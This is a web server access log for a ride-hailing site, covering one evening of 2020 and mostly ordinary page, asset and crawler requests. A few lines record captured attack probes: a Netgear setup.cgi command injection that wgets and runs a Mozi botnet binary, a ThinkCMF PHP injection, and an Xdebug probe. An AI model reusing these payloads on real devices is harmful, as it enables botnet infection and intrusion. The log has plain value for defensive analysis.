108.162.219.15 - - [01/Oct/2020:21:06:53 +0000] "GET / HTTP/1.1" 200 27291 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
173.245.52.204 - - [01/Oct/2020:21:06:53 +0000] "GET /asset/js/map.js HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
162.158.62.48 - - [01/Oct/2020:21:06:53 +0000] "GET /asset/img/destination.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
162.158.62.48 - - [01/Oct/2020:21:06:53 +0000] "GET /asset/img/taxi-car.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
162.158.62.38 - - [01/Oct/2020:21:06:53 +0000] "GET /asset/img/taxi-app.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
108.162.219.57 - - [01/Oct/2020:21:06:53 +0000] "GET /asset/img/screen-bg.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
162.158.63.117 - - [01/Oct/2020:21:06:53 +0000] "GET /asset/img/screen-bg-3.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
108.162.219.69 - - [01/Oct/2020:21:06:53 +0000] "GET /asset/img/seat-belt.png HTTP/1.1" 200 23451 "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
108.162.219.211 - - [01/Oct/2020:21:06:53 +0000] "GET /asset/img/car-wheel.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
162.158.62.42 - - [01/Oct/2020:21:06:53 +0000] "GET /asset/img/support.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
173.245.52.198 - - [01/Oct/2020:21:06:53 +0000] "GET /asset/img/user-playstore.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
108.162.219.187 - - [01/Oct/2020:21:06:53 +0000] "GET /asset/img/taxi-location.png HTTP/1.1" 200 19634 "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
108.162.219.181 - - [01/Oct/2020:21:06:53 +0000] "GET /asset/img/user-appstore.png HTTP/1.1" 200 13527 "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
162.158.62.8 - - [01/Oct/2020:21:06:53 +0000] "GET /asset/img/budget.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
108.162.219.61 - - [01/Oct/2020:21:06:53 +0000] "GET /asset/img/screen-bg-4.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
173.245.52.68 - - [01/Oct/2020:21:06:53 +0000] "GET /asset/img/provider-appstore.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
173.245.52.128 - - [01/Oct/2020:21:06:53 +0000] "GET /asset/img/cost-cities.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
162.158.62.74 - - [01/Oct/2020:21:06:53 +0000] "GET /asset/img/provider-playstore.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
108.162.219.217 - - [01/Oct/2020:21:06:53 +0000] "GET /asset/img/question.png HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
162.158.63.197 - - [01/Oct/2020:21:06:53 +0000] "GET /js/jquery.min.js HTTP/1.1" 404 1118 "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
173.245.52.68 - - [01/Oct/2020:21:06:53 +0000] "GET /asset/img/behind-the-wheel.jpg HTTP/1.1" 200 50452 "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
162.158.62.30 - - [01/Oct/2020:21:06:53 +0000] "GET /asset/img/safty-bg.jpg HTTP/1.1" 200 194589 "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
173.245.52.168 - - [01/Oct/2020:21:06:53 +0000] "GET /asset/img/app-download-bg.jpg HTTP/1.1" 304 - "https://getmeride.com/asset/css/style.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
108.162.219.13 - - [01/Oct/2020:21:06:53 +0000] "GET /asset/img/slider-bg-1.jpg HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
108.162.219.67 - - [01/Oct/2020:21:06:53 +0000] "GET /asset/fonts/clan/ClanPro-Book.otf HTTP/1.1" 304 - "https://getmeride.com/asset/css/style.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
162.158.63.227 - - [01/Oct/2020:21:06:53 +0000] "GET /asset/fonts/clan/ClanPro-Medium.otf HTTP/1.1" 304 - "https://getmeride.com/asset/css/style.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
108.162.219.127 - - [01/Oct/2020:21:06:53 +0000] "GET /asset/font-awesome/fonts/fontawesome-webfont.woff2?v=4.4.0 HTTP/1.1" 200 64464 "https://getmeride.com/asset/font-awesome/css/font-awesome.min.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
173.245.52.68 - - [01/Oct/2020:21:06:58 +0000] "GET /uploads/e632445069e2838d2ca83d968d9d2435cc0726fd.png HTTP/1.1" 404 1118 "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
108.162.219.15 - - [01/Oct/2020:21:07:13 +0000] "GET /login HTTP/1.1" 200 3952 "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
162.158.62.110 - - [01/Oct/2020:21:07:13 +0000] "GET /asset/img/login-user-bg.jpg HTTP/1.1" 200 115855 "https://getmeride.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
108.162.219.15 - - [01/Oct/2020:21:07:43 +0000] "GET /ride HTTP/1.1" 200 27085 "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
162.158.62.108 - - [01/Oct/2020:21:07:44 +0000] "GET /asset/img/car-slide4.png HTTP/1.1" 200 10892 "https://getmeride.com/ride" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
108.162.219.11 - - [01/Oct/2020:21:07:44 +0000] "GET /asset/img/car-slide2.png HTTP/1.1" 200 11343 "https://getmeride.com/ride" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
108.162.219.159 - - [01/Oct/2020:21:07:44 +0000] "GET /asset/img/car-slide1.png HTTP/1.1" 200 10890 "https://getmeride.com/ride" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
108.162.219.91 - - [01/Oct/2020:21:07:44 +0000] "GET /asset/img/car-slide3.png HTTP/1.1" 200 10890 "https://getmeride.com/ride" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
162.158.62.220 - - [01/Oct/2020:21:07:44 +0000] "GET /asset/img/banner-bg.jpg HTTP/1.1" 200 329218 "https://getmeride.com/ride" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
162.158.63.197 - - [01/Oct/2020:21:07:44 +0000] "GET /js/jquery.min.js HTTP/1.1" 404 1118 "https://getmeride.com/ride" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
108.162.219.35 - - [01/Oct/2020:21:09:04 +0000] "GET /robots.txt HTTP/1.1" 304 - "-" "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)"
108.162.219.15 - - [01/Oct/2020:21:09:23 +0000] "GET /drive HTTP/1.1" 200 21663 "https://getmeride.com/ride" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
162.158.63.197 - - [01/Oct/2020:21:09:23 +0000] "GET /js/jquery.min.js HTTP/1.1" 404 1118 "https://getmeride.com/drive" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
162.158.62.120 - - [01/Oct/2020:21:09:23 +0000] "GET /asset/img/driver-car.jpg HTTP/1.1" 200 36706 "https://getmeride.com/drive" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
108.162.219.105 - - [01/Oct/2020:21:09:23 +0000] "GET /asset/img/driving-license.png HTTP/1.1" 200 15109 "https://getmeride.com/drive" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
123.130.128.143 - - [01/Oct/2020:21:23:40 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://123.130.128.143:58689/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 1118 "-" "-"
108.162.219.189 - - [01/Oct/2020:21:31:10 +0000] "POST /api/user/verify HTTP/1.1" 200 29 "-" "okhttp/3.12.1"
108.162.219.39 - - [01/Oct/2020:21:31:26 +0000] "GET /privacy HTTP/1.1" 200 18113 "-" "Mozilla/5.0 (Linux; Android 10; LM-V405 Build/QKQ1.191222.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.4147.89 Mobile Safari/537.36"
108.162.219.121 - - [01/Oct/2020:21:31:27 +0000] "GET /asset/css/style.css HTTP/1.1" 304 - "https://getmeride.com/privacy" "Mozilla/5.0 (Linux; Android 10; LM-V405 Build/QKQ1.191222.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.4147.89 Mobile Safari/537.36"
173.245.52.210 - - [01/Oct/2020:21:31:27 +0000] "GET /asset/css/bootstrap.min.css HTTP/1.1" 304 - "https://getmeride.com/privacy" "Mozilla/5.0 (Linux; Android 10; LM-V405 Build/QKQ1.191222.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.4147.89 Mobile Safari/537.36"
162.158.62.32 - - [01/Oct/2020:21:31:27 +0000] "GET /asset/font-awesome/css/font-awesome.min.css HTTP/1.1" 304 - "https://getmeride.com/privacy" "Mozilla/5.0 (Linux; Android 10; LM-V405 Build/QKQ1.191222.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.4147.89 Mobile Safari/537.36"
108.162.219.127 - - [01/Oct/2020:21:31:27 +0000] "GET /asset/font-awesome/fonts/fontawesome-webfont.woff2?v=4.4.0 HTTP/1.1" 200 64464 "https://getmeride.com/asset/font-awesome/css/font-awesome.min.css" "Mozilla/5.0 (Linux; Android 10; LM-V405 Build/QKQ1.191222.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.4147.89 Mobile Safari/537.36"
173.245.52.68 - - [01/Oct/2020:21:31:27 +0000] "GET /uploads/e632445069e2838d2ca83d968d9d2435cc0726fd.png HTTP/1.1" 404 1118 "https://getmeride.com/privacy" "Mozilla/5.0 (Linux; Android 10; LM-V405 Build/QKQ1.191222.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.4147.89 Mobile Safari/537.36"
108.162.219.189 - - [01/Oct/2020:21:31:57 +0000] "POST /api/user/signup HTTP/1.1" 500 22209 "-" "okhttp/3.12.1"
108.162.219.189 - - [01/Oct/2020:21:32:35 +0000] "POST /api/user/signup HTTP/1.1" 422 47 "-" "okhttp/3.12.1"
162.158.62.26 - - [01/Oct/2020:21:33:21 +0000] "POST /api/user/oauth/token HTTP/1.1" 500 24698 "-" "okhttp/3.12.1"
162.158.62.26 - - [01/Oct/2020:21:33:24 +0000] "POST /api/user/oauth/token HTTP/1.1" 500 24698 "-" "okhttp/3.12.1"
162.158.62.26 - - [01/Oct/2020:21:33:25 +0000] "POST /api/user/oauth/token HTTP/1.1" 500 24698 "-" "okhttp/3.12.1"
162.158.62.26 - - [01/Oct/2020:21:33:26 +0000] "POST /api/user/oauth/token HTTP/1.1" 500 24698 "-" "okhttp/3.12.1"
162.158.62.26 - - [01/Oct/2020:21:33:29 +0000] "POST /api/user/oauth/token HTTP/1.1" 500 24698 "-" "okhttp/3.12.1"
162.158.63.101 - - [01/Oct/2020:21:36:39 +0000] "GET / HTTP/1.1" 200 27291 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
173.245.52.68 - - [01/Oct/2020:21:36:39 +0000] "GET /uploads/e632445069e2838d2ca83d968d9d2435cc0726fd.png HTTP/1.1" 404 1118 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
162.158.62.148 - - [01/Oct/2020:21:53:17 +0000] "GET / HTTP/1.1" 200 27291 "https://www.google.com.sg/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
173.245.52.198 - - [01/Oct/2020:21:53:34 +0000] "GET /asset/js/scripts.js HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
108.162.219.155 - - [01/Oct/2020:21:53:34 +0000] "GET /asset/js/bootstrap.min.js HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
162.158.62.64 - - [01/Oct/2020:21:53:34 +0000] "GET /asset/js/jquery.min.js HTTP/1.1" 304 - "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
162.158.63.197 - - [01/Oct/2020:21:53:34 +0000] "GET /js/jquery.min.js HTTP/1.1" 404 1118 "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
162.158.63.101 - - [01/Oct/2020:21:54:16 +0000] "GET / HTTP/1.1" 200 27291 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
162.158.63.197 - - [01/Oct/2020:21:54:18 +0000] "GET /js/jquery.min.js HTTP/1.1" 404 1118 "http://getmeride.com/" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/85.0.4183.122 Safari/537.36"
108.162.219.133 - - [01/Oct/2020:21:55:13 +0000] "GET /favicon.ico HTTP/1.1" 404 1118 "-" "Googlebot-Image/1.0"
162.158.62.48 - - [01/Oct/2020:22:01:27 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 27291 "http://159.203.122.44:80/?XDEBUG_SESSION_START=phpstorm" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
192.35.168.251 - - [01/Oct/2020:22:17:02 +0000] "GET / HTTP/1.1" 200 27220 "-" "-"
192.35.168.251 - - [01/Oct/2020:22:17:02 +0000] "GET / HTTP/1.1" 200 27220 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
108.162.219.123 - - [01/Oct/2020:22:29:27 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 27291 "http://159.203.122.44:80/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
162.158.62.88 - - [01/Oct/2020:22:47:39 +0000] "GET / HTTP/1.1" 200 27291 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
162.158.63.197 - - [01/Oct/2020:22:47:40 +0000] "GET /js/jquery.min.js HTTP/1.1" 404 1118 "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.127 - - [01/Oct/2020:22:47:40 +0000] "GET /asset/font-awesome/fonts/fontawesome-webfont.woff2?v=4.4.0 HTTP/1.1" 200 64464 "https://getmeride.com/asset/font-awesome/css/font-awesome.min.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
162.158.63.197 - - [01/Oct/2020:22:47:41 +0000] "GET /js/jquery.min.js HTTP/1.1" 404 1118 "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
162.158.62.88 - - [01/Oct/2020:22:47:42 +0000] "GET /login HTTP/1.1" 200 3952 "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
173.245.52.68 - - [01/Oct/2020:22:47:43 +0000] "GET /uploads/e632445069e2838d2ca83d968d9d2435cc0726fd.png HTTP/1.1" 404 1118 "https://getmeride.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
162.158.62.88 - - [01/Oct/2020:22:47:44 +0000] "GET /auth/facebook HTTP/1.1" 302 756 "https://getmeride.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
162.158.62.88 - - [01/Oct/2020:22:47:56 +0000] "GET / HTTP/1.1" 200 27291 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
162.158.63.197 - - [01/Oct/2020:22:47:56 +0000] "GET /js/jquery.min.js HTTP/1.1" 404 1118 "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
162.158.62.88 - - [01/Oct/2020:22:47:58 +0000] "GET /login HTTP/1.1" 200 3952 "https://getmeride.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
162.158.62.88 - - [01/Oct/2020:22:48:08 +0000] "GET /register HTTP/1.1" 200 9026 "https://getmeride.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
108.162.219.35 - - [01/Oct/2020:22:54:18 +0000] "GET /app-ads.txt HTTP/1.1" 404 1118 "-" "Google-adstxt"
108.162.219.155 - - [01/Oct/2020:23:01:32 +0000] "GET / HTTP/1.1" 200 27291 "-" "-"
173.245.52.196 - - [01/Oct/2020:23:01:32 +0000] "GET / HTTP/1.1" 200 27291 "-" "Mozilla/5.0 (Windows NT 6.1; rv:2.0) Gecko/20100101 Firefox/4.0"
108.162.219.205 - - [01/Oct/2020:23:01:35 +0000] "GET / HTTP/1.1" 200 27291 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
162.158.62.88 - - [01/Oct/2020:23:01:37 +0000] "GET /ride HTTP/1.1" 200 27085 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
108.162.219.15 - - [01/Oct/2020:23:01:39 +0000] "GET /drive HTTP/1.1" 200 21663 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
108.162.219.249 - - [01/Oct/2020:23:01:39 +0000] "GET /login HTTP/1.1" 200 3952 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
162.158.62.232 - - [01/Oct/2020:23:01:39 +0000] "GET /help HTTP/1.1" 200 17594 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
173.245.52.86 - - [01/Oct/2020:23:01:40 +0000] "GET /provider/register HTTP/1.1" 200 9992 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
162.158.62.148 - - [01/Oct/2020:23:01:40 +0000] "GET / HTTP/1.1" 200 27291 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
108.162.219.189 - - [01/Oct/2020:23:01:41 +0000] "GET /register HTTP/1.1" 200 9026 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
162.158.63.155 - - [01/Oct/2020:23:01:43 +0000] "GET /provider/login HTTP/1.1" 200 3843 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
162.158.63.155 - - [01/Oct/2020:23:01:53 +0000] "GET / HTTP/1.1" 200 27291 "-" "-"
162.158.62.150 - - [01/Oct/2020:23:01:53 +0000] "GET //sitemap.html HTTP/1.1" 404 1118 "-" "-"
162.158.62.26 - - [01/Oct/2020:23:01:53 +0000] "GET /sitemap.xml HTTP/1.1" 404 1118 "-" "Mozilla/5.0 (Windows NT 6.1; rv:2.0) Gecko/20100101 Firefox/4.0"
108.162.219.69 - - [01/Oct/2020:23:01:53 +0000] "GET / HTTP/1.1" 200 27291 "-" "-"
173.245.52.196 - - [01/Oct/2020:23:01:53 +0000] "GET //sitemap.html HTTP/1.1" 404 1118 "-" "-"
162.158.63.155 - - [01/Oct/2020:23:01:53 +0000] "GET /sitemap.xml HTTP/1.1" 404 1118 "-" "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
162.158.63.51 - - [01/Oct/2020:23:01:53 +0000] "GET /sitemap.html HTTP/1.1" 404 1118 "-" "-"
108.162.219.189 - - [01/Oct/2020:23:01:53 +0000] "GET /website-sitemap.xml HTTP/1.1" 404 1118 "-" "Mozilla/5.0 (Windows NT 6.1; rv:2.0) Gecko/20100101 Firefox/4.0"
162.158.62.88 - - [01/Oct/2020:23:01:53 +0000] "GET / HTTP/1.1" 200 27291 "-" "Mozilla/5.0 (Windows NT 6.1; rv:2.0) Gecko/20100101 Firefox/4.0"
162.158.62.150 - - [01/Oct/2020:23:01:53 +0000] "GET /website-sitemap.xml HTTP/1.1" 404 1118 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_7; da-dk) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1"
108.162.219.69 - - [01/Oct/2020:23:01:53 +0000] "GET /sitemap_index.xml HTTP/1.1" 404 1118 "-" "Mozilla/5.0 (Windows NT 6.1; rv:2.0) Gecko/20100101 Firefox/4.0"
108.162.219.49 - - [01/Oct/2020:23:01:53 +0000] "GET / HTTP/1.1" 200 27291 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5 Build/MRA58N) AppleWebKit/537.36(KHTML, like Gecko) Chrome/66.0.3359.30 Mobile Safari/537.36"
173.245.52.198 - - [01/Oct/2020:23:01:54 +0000] "GET / HTTP/1.1" 200 27291 "-" "Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0"
108.162.219.43 - - [01/Oct/2020:23:01:54 +0000] "GET / HTTP/1.1" 200 27291 "-" "curl/7.38.0"
162.158.63.51 - - [01/Oct/2020:23:01:54 +0000] "GET /sitemap_index.xml HTTP/1.1" 404 1118 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100508 SeaMonkey/2.0.4"
162.158.63.197 - - [01/Oct/2020:23:01:54 +0000] "GET /js/jquery.min.js HTTP/1.1" 404 1118 "http://getmeride.com/" "Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0"
108.162.219.67 - - [01/Oct/2020:23:01:54 +0000] "GET /asset/fonts/clan/ClanPro-Book.otf HTTP/1.1" 200 95780 "http://getmeride.com/" "Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0"
162.158.62.78 - - [01/Oct/2020:23:01:54 +0000] "GET /asset/font-awesome/fonts/fontawesome-webfont.woff?v=4.4.0 HTTP/1.1" 200 81284 "http://getmeride.com/" "Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0"
162.158.63.227 - - [01/Oct/2020:23:01:54 +0000] "GET /asset/fonts/clan/ClanPro-Medium.otf HTTP/1.1" 200 98116 "http://getmeride.com/" "Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0"
